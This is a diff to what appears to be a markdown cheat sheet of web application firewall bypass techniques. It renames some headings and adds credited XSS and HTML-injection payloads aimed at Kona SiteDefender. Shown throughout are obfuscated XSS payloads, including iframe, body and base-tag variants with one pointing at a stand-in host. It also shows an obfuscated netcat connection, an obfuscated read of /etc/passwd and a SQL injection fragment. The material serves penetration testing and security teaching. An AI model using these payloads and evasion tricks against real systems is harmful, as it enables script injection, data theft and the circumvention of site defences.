@@ -2349,7 +2349,7 @@ __Standard__: `/bin/nc 127.0.0.1 1337`
 __Obfuscated__: `/???/n? 2130706433 1337`  
 Used chars: `/ ? n [0-9]`
 
-__9. String Concatenation__
+__9. Dynamic Payload Generation__
 - Different programming languages have different syntaxes and patterns for concatenation.
 - This allows us to effectively generate payloads that can bypass many filters and rules.
 
@@ -2363,7 +2363,7 @@ __Obfuscated__: `/bi'n'''/c''at' /e'tc'/pa''ss'wd`
 __Standard__: `<iframe/onload='this["src"]="javascript:alert()"';>`  
 __Obfuscated__: `<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>`
 
-__9. Junk Chars__
+__9. Junk Characters__
 - Normal payloads get filtered out easily.
 - Adding some junk chars helps avoid detection (specific cases only).
 - They often help in confusing regex based firewalls.
@@ -2382,8 +2382,8 @@ __10. Line Breaks__
 - Many WAF with regex based filtering effectively blocks many attempts.
 - Line breaks (CR/LF) can break firewall regex and bypass stuff.
 
-__Standard__: `<iframe src=javascript:alert(0)">`  
-__Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">`
+__Standard__: `<iframe src=javascript:confirm(0)">`  
+__Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)">`
 
 __11. Uninitialized Variables__
 - Uninitialized bash variables can evade bad regular expression based filters and pattern match.
@@ -2420,7 +2420,7 @@ __Variant__: `<IMG SRC="    jav    ascri    pt:alert    ();">`
 __Standard__: `<iframe src=javascript:alert(1)></iframe>`  
 __Obfuscated__: 
 ```
-<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 ```
 
 __13. Obfuscation in Other Formats__  
@@ -2694,7 +2694,7 @@ GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&co
 Host: favoritewaf.com
 User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 ```
-- XSS Bypass by [0xInfection](https://twitter.com/0xInfection)
+- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
 ```
 <a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
 ```
@@ -2971,13 +2971,25 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 - [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)
 
 ### Kona SiteDefender
-- XSS Bypass by [@zseano](https://twitter.com/zseano)
+- [HTML Injection](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
+```
+%2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E
+```
+- [XSS Bypass](https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c) by [@Jonathan Bouman](https://twitter.com/jonathanbouman)
+```
+<body%20alt=al%20lang=ert%20onmouseenter="top['al'+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)"
+```
+- [XSS Bypass](https://twitter.com/XssPayloads/status/1008573444840198144?s=20) by [@zseano](https://twitter.com/zseano)
 ```
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 - XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
 ```
 <abc/onmouseenter=confirm%60%60>
+```
+- [XSS Bypass](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
+```
+%2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E
 ```
 
 ### Profense
